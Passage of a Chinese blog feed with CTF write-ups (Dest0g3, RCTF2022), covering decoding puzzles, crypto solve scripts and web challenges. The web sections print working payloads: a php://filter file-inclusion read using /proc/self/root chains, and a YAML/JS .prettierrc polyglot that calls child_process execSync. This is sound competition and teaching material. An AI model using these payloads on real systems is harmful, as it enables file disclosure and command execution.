</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;unavailable&quot;</span> <span class="attr">class</span>=<span class="string">&quot;loading&quot;</span>&gt;</span>Building js.....<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">language</span>=<span class="string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">					<span class="keyword">function</span> <span class="title function_">RunFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> <span class="title class_">WshShell</span> = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">					<span class="title class_">WshShell</span>.<span class="title class_">Run</span>(<span class="string">&quot;notepad %windir%/Desktop/js.txt&quot;</span>, <span class="number">1</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">          <span class="comment">/* var oExec = WshShell.Exec(&quot;notepad&quot;); */</span></span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Implant Inception Here&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;RunFile();&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:white;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- </span><br><span class="line">-.-.- --.++ ++++.</span><br><span class="line">+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- </span><br><span class="line">&gt;---&lt; ]&gt;--- ---.+ ++++. -----</span><br><span class="line">.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.</span><br><span class="line">&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+</span><br><span class="line"> +++++ .---- -.++. ++.+.</span><br><span class="line">--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- </span><br><span class="line">.+.-. ---.+ ++.+. -.+++</span><br><span class="line">+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---</span><br><span class="line">-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ </span><br><span class="line">.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.</span><br><span class="line">+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ </span><br><span class="line">.---- .+.++ ++.-- --.++</span><br><span class="line">++.-. ----. +.-.+ ++++. </span><br><span class="line">&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&#x27;));<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>辨别是Brainfuck/Ook!编码，使用在线工具解码：[Brainfuck/Ook! Obfuscation/Encoding <a href="https://www.splitbrain.org/services/ook">splitbrain.org]</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0c0c85c1672f49479a6dc2be0e5ddf94.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>解出获得：</p>
<p>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/f73ae5e6532e4414b16ffc0539177ed6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>接着Hex转文字就可以，使用在线工具<a href="https://the-x.cn/zh-cn/encodings/Hex.aspx">HEX转字符 十六进制转字符 hex gb2312 gbk utf8 汉字内码转换 - The X 在线工具 (the-x.cn)</a></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0670b90edc9a407f9a1457e45eed2fbc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>获取flag：Dest0g3{86facac9-0a5d-4047-b702-86cb37ab77b2}</p>
<h3 id="strangetraffic"><a class="markdownIt-Anchor" href="#strangetraffic"></a> StrangeTraffic</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng">https://files.buuoj.cn/files/c329bafcc0113003c060d62f8f99b2e7/StrangeTraffic.pcapng</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、下载附件，虚拟机kali打开文件，wireshark分析，可以看出是mudbus工控流量。追踪TCP流，在流0处看到可疑的东西，将展现形式改为Hex转储</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/40498cc937884428b33e0efc49584871.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、在尾部存在base64特征编码，手动提取：</p>
<p>RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/7a35322cfd9a4b458cbe866587f2454d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/cf147a5e73dd449d98750098326703bd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获取flag：Dest0g3{31A5BEA6-F20D-F18A-E8EA-29B4F257108B}</p>
</blockquote>
<h3 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h3>
<p>**题目描述：**Let the word tell u</p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip">https://files.buuoj.cn/files/aae5e40774fcd4089557007b1b030f41/EasyWord.zip</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>下载附件，打开压缩包，得到一个加密的docm文件，hint提示说六位小写字母加密，并给出了第三位和第五位，于是考虑用工具AOPRT:</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/d4f37e4627004af2911f0a31afd5f141.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>爆破了好几次，结果都不对，别放弃使用该方法。</p>
</blockquote>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="phpdest"><a class="markdownIt-Anchor" href="#phpdest"></a> phpdest</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/">http://d10eb908-5734-4807-9b12-493d578d495c.node4.buuoj.cn:81/</a>(环境在Buuctf一直都有，可以自行打开）</p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开链接，获得解密源码，第一时间想到的是文件包含，堆叠注入。构建payload试一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/15c694e4a91444b9bc0cce7ce6334798.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>没有回显，对php代码审计，发现 require_once函数，发现干货了</p>
</blockquote>
<blockquote>
<p>require_once() 语句在脚本执行期间包括并运行指定文件。此<a href="http://www.php.cn/php/php-tp-behavior.html">行为</a>和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。</p>
<p>PHP最新版的小Trick,require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/<span class="built_in">proc</span>/[pid]<span class="string">`记录了系统运行的信息状态，而`</span>/<span class="built_in">proc</span>/<span class="variable language_">self</span><span class="string">`指的是当前进程(自身进程)的pid，就类似于类里面的`</span>this</span><br></pre></td></tr></table></figure>
<p><code>/proc/self/root/</code>是指向<code>/</code>的符号链接</p>
</blockquote>
<blockquote>
<p>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3af4fa34b35446609646329ab107b20c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获得flag.php的源码，base64解码获得flag：</p>
<p>Dest0g3{f05260c1-70e9-481b-89b1-eb397377f621}</p>
</blockquote>
<h3 id="easyphp"><a class="markdownIt-Anchor" href="#easyphp"></a> EasyPHP</h3>
<p>**题目描述：**Post something</p>
<p><strong>附件下载：</strong><a href="http://d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81/">d7cb2110-b7b2-4ff0-9ce7-a5788de17012.node4.buuoj.cn:81</a>(环境在Buuctf一直都有，可以自行打开）</p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开链接，获取界面：</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/e36c7a302fd44ad392077cd7e4e91506.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>2、没啥干的，直接代码审计</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="comment">//高亮显示，没啥用</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;<span class="comment">//读取fl4g.php文件</span></span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];<span class="comment">//对dest0g3传入参数‘ctf’</span></span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);<span class="comment">//对时间的限制，下同</span></span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;<span class="comment">//如果时间为假，则输出fl4g，反之输出&quot;Try harder!&quot;,很显然时间不可能为假。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(//看到这个函数，就有解了后有详解，既对传入参数进行比对，只要让他运行错误就行。</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>干货：set_error_handler () 函数<strong>设置用户自定义的错误处理函数</strong>。. 该函数用于创建运行时期间的用户自己的错误处理方法。. 该函数会返回旧的错误处理程序，若失败，则返回 null。</p>
</blockquote>
<blockquote>
<p>3、构建数组报错POST：ctf[]=1</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/dff3286ffba6434fac7bb6c3a38f6ec5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<blockquote>
<p>获取flag：Dest0g3{a57b8d1d-da8f-42ee-a782-3a92bc372ec3}</p>
</blockquote>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py">https://files.buuoj.cn/files/28e6d9906de54ebfdc565f9ef541bcbf/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、打开附件，fofa分解n，常规解。上脚本，获取flag。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line">n = <span class="number">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401</span></span><br><span class="line">p = <span class="number">165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467</span></span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m 的十进制形式</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># m明文</span></span><br><span class="line"><span class="built_in">print</span>(string)  <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h3 id="babyaes"><a class="markdownIt-Anchor" href="#babyaes"></a> babyAES</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py">https://files.buuoj.cn/files/ded8ebffd78bc71ff21b41701727c875/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、打开附件，AES常规解。上脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line">flag = my_aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
</blockquote>
<h3 id="ezdlp"><a class="markdownIt-Anchor" href="#ezdlp"></a> ezDLP</h3>
<p><strong>题目描述：</strong></p>
<p>**附件下载：**<a href="https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py">https://files.buuoj.cn/files/67d5c3e2b9ac73c8ebf66665b077e33f/task.py</a></p>
<p><strong>做题过程：</strong></p>
<blockquote>
<p>1、点开附件，尝试用Pohlig-Hellman 算法的方法，进行解密，但是想不通，就去搜了一下对pow（）逆运算，发现sage有相应的函数，写解密脚本，放到sagemath（<a href="https://sagecell.sagemath.org/">Sage Cell Server (sagemath.org)</a>）中运行。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line">g = <span class="number">19</span></span><br><span class="line">p = <span class="number">335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353</span></span><br><span class="line">h = <span class="number">199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162</span></span><br><span class="line">d=discrete_log(h,mod(g,p))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#接着在本地环境运行以下代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="number">627467212751652661100750674849894892358409405070345081253130721039787502632741519936253501608002590652971133</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2022-Writeup</title>
    <url>/2022/12/RCTF2022-Writeup/</url>
    <content><![CDATA[<p>部分为比赛中的解题过程，部分为赛后复现题解QAQ</p>
<span id="more"></span>
<h1 id="rctf2022-writeup"><a class="markdownIt-Anchor" href="#rctf2022-writeup"></a> RCTF2022-Writeup</h1>
<p>​                                                                                                                                                               ---------------TWe1v3</p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2>
<h3 id="ez_alient"><a class="markdownIt-Anchor" href="#ez_alient"></a> ez_alient</h3>
<p>使用zsteg扫描alien.tmp获得一串base64编码</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221210144522995.png" alt="01"></p>
<p>解码得到：<code>pwd=&quot;N0bOdy_l0ves_Me&quot;</code></p>
<p>解压alien_invasion.zip，获得alien_invasion文件，使用file指令识别得知是<code>PE32+ executable (console) x86-64, for MS Windows</code>，使用PyInstaller Extractor对文件进行反编译，注意这里的系统python版本一定得是3.8的，不然反编译不完全。</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212245026.png" alt="image-20221221212245026"></p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221213006594.png" alt="image-20221221213006594"></p>
<p>使用010editor打开alien_invasion.pyc，能够看到有这提示</p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212640499.png" alt="image-20221221212640499"></p>
<p>从alien_invasion.pyc得到一串base64编码<code>VTJreE0yNWpNdz09</code>，解码为：<code>Si13nc3</code></p>
<p><img src="/2022/12/RCTF2022-Writeup/image-20221221212807233.png" alt="image-20221221212807233"></p>
<p>打开PYZ-00.pyz_extracted文件夹，根据alien_invasion.pyc中的指示pyc文件中获得相关base64编码，统计为：</p>
<table>
<thead>
<tr>
<th>字符串</th>
<th>解码</th>
<th>pyc文件</th>
</tr>
</thead>
<tbody>
<tr>
<td>s = b’VTJreE0yNWpNdz09’</td>
<td>Si13nc3</td>
<td>alien_invasion.pyc</td>
</tr>
<tr>
<td>a = b’TVRVPQ==’</td>
<td>15</td>
<td>alien.pyc</td>
</tr>
<tr>
<td>l = b’Tm5WMA==’</td>
<td>6ut</td>
<td>settings.pyc</td>
</tr>
<tr>
<td>m = b’YURBeFpHbHVPUT09   VDI0PQ==    VTJreE0yNVVNWGs9’</td>
<td>h01din9_On_Si13nT1y</td>
<td>ship.pyc</td>
</tr>
<tr>
<td>a = b’YmtWMlJYST0=’</td>
<td>nEvEr</td>
<td>bullet.pyc</td>
</tr>
<tr>
<td>t = b’ZFhBPQ==’</td>
<td>up</td>
<td>game_stats.pyc</td>
</tr>
<tr>
<td>k = b’T1dsMmFXNDU=’</td>
<td>9ivin9</td>
<td>button.pyc</td>
</tr>
<tr>
<td>m = b’SmlZPQ==’</td>
<td>&amp;&amp;</td>
<td>scoreboard.pyc</td>
</tr>
</tbody>
</table>
<p>简单拼接可得flag：</p>
<p>RCTF{Si13nc3_15_nEvEr_9ivin9_up_&amp;&amp;_6ut_h01din9_On_Si13nT1y}</p>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="prettieronline"><a class="markdownIt-Anchor" href="#prettieronline"></a> PrettierOnline</h3>
<p>查看<code>.prettierrc</code>的配置文件说明<a href="https://prettier.io/docs/en/configuration.html">Configuration File · Prettier</a></p>
<p>A file written in JSON or YAML.<code>.prettierrc</code></p>
<p>即<code>.prettierrc</code>支持JSON和YAML两种配置文件，即需要我构建配置文件能够被解析成JS文件和YAML文件。</p>
<p>经测试<img src="/2022/12/RCTF2022-Writeup/image-20221221223518864.png" alt="image-20221221223518864"></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">var</span> <span class="string">T=`</span> <span class="string">`;console.log(&#x27;TWe1v3&#x27;)/*</span></span><br><span class="line"><span class="attr">trailingComma:</span> <span class="string">es5</span></span><br><span class="line"><span class="attr">tabWidth:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">semi:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">singleQuote:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">parser:</span> <span class="string">.prettierrc</span></span><br><span class="line"><span class="comment"># */</span></span><br></pre></td></tr></table></figure>
<p>是能够在控制台中打印出字符，接下来就是bypass sandbox</p>
<p>查阅 <a href="https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/%E8%8E%B7%E5%BE%97%E6%9C%80%E5%90%8E%E7%9A%84payload">https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/获得最后的payload</a></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">var</span> <span class="string">T=`:</span> <span class="comment">#`;module.exports = ()=&gt;&#123;return global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString()&#125;;/*</span></span><br><span class="line"><span class="attr">trailingComma:</span> <span class="string">es5</span></span><br><span class="line"><span class="attr">tabWidth:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">semi:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">singleQuote:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">parser:</span> <span class="string">.prettierrc</span></span><br><span class="line"><span class="comment"># */</span></span><br></pre></td></tr></table></figure>
<p>RCTF{pReTtiErRc.yAmL.iS.fUnnY}</p>
<h3 id="easy_upload"><a class="markdownIt-Anchor" href="#easy_upload"></a> easy_upload</h3>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>MT-CTF-Writeup</title>
    <url>/2022/09/MT-CTF-Writeup/</url>
    <content><![CDATA[<p>美团CTF，好玩的，难度也不错，师傅们太强啦！</p>
<span id="more"></span>
<h1 id="mininep1战队-mt-ctf-writeup"><a class="markdownIt-Anchor" href="#mininep1战队-mt-ctf-writeup"></a> <strong>MiniNep1战队-MT-CTF-Writeup</strong></h1>
<h2 id="战队信息"><a class="markdownIt-Anchor" href="#战队信息"></a> <strong>战队信息：</strong></h2>
<h3 id="战队成员twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"><a class="markdownIt-Anchor" href="#战队成员twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"></a> 战队成员：TWe1v3、zealot、1amfree、scr1pt_k1ddi3、ZERO</h3>
<h3 id="战队名称mininep1"><a class="markdownIt-Anchor" href="#战队名称mininep1"></a> <strong>战队名称：MiniNep1</strong></h3>
<h3 id="战队排名"><a class="markdownIt-Anchor" href="#战队排名"></a> <strong>战队排名：</strong></h3>
